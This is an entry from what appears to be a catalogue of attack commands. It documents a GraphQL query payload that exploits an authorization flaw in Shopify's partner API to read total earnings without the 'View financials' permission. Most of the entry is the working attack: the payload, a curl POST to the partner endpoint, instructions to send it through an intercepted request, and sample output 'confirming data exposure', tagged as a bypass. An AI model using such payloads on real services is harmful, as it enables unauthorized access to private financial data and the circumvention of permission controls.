---
id: cmd-shopify-graphql-query
data: '{ "query":"{ serviceMetrics { totalEarnings { amount } } }" }'
tags:
  - graphql
  - query
  - bypass
type: command
output: '{ "data":{ "serviceMetrics":{ "totalEarnings":{ "amount":"0.0" } } } }'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.453Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-service-metrics-query

## Command

```json
{ "query":"{ serviceMetrics { totalEarnings { amount } } }" }
```

## Description

This GraphQL query payload retrieves the totalEarnings amount from serviceMetrics in Shopify's partner API, exploiting improper authorization to access financial data without 'View financials' permission. Use in an intercepted POST request to https://partners.shopify.com/:id/api/graphql.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| query | GraphQL query string targeting serviceMetrics totalEarnings amount | Yes |

## Examples

### Basic Usage

Send as JSON body in a POST request:

```json
{ "query":"{ serviceMetrics { totalEarnings { amount } } }" }
```

### Advanced Usage

Include in a full HTTP request with headers (e.g., via curl or proxy):

```bash
curl -X POST https://partners.shopify.com/:id/api/graphql \
  -H "Content-Type: application/json" \
  -d '{ "query":"{ serviceMetrics { totalEarnings { amount } } }" }'
```

## Expected Output

Successful response includes the financial amount in JSON format, e.g., { "data":{ "serviceMetrics":{ "totalEarnings":{ "amount":"0.0" } } } }, confirming data exposure.

## Related

- [[Related Procedure]]
